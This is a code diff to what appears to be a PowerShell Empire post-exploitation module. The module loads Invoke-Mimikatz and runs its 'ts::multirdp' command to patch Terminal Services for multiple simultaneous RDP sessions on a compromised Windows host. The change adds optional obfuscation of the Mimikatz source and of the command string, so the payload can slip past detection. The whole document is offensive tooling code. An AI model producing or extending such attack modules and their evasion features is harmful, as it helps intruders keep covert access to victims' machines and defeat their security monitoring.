@@ -53,11 +53,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -69,6 +71,8 @@ class Module:
 
         script = moduleCode
 
-        script += "Invoke-Mimikatz -Command '\"ts::multirdp\"';"
-
+        scriptEnd = "Invoke-Mimikatz -Command '\"ts::multirdp\"';"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
